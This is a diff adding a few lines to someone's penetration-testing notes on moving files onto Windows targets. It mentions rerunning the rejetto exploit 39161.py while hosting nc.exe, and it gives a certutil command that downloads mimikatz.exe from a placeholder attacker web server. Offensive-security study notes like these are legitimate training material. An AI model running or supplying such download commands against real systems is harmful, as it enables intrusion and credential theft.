@@ -1458,6 +1458,11 @@ With an anonymous null session you can access the IPC$ share and interact with s
       - python -m SimpleHTTPServer 80
       - python3 -m http.server 80
   
+  ### Transferring files to windows targets
+  - JUST A NOTE FOR ME: Some Exploits from ExploitDB etc. you'll need to run twice! For example the following exploit: 39161.py (rejetto exploit) AND in this case remember to start a webserver that's hosting nc.exe!!!!
+  - we can use the "certutil -urlcache -f http://x.x.x.x/mimikatz.exe mimikatz.exe" (In this example we are downloading mimikatz.exe from a python webserver)
+  
+  ### Transferring Files to Linux targets
   
   
   
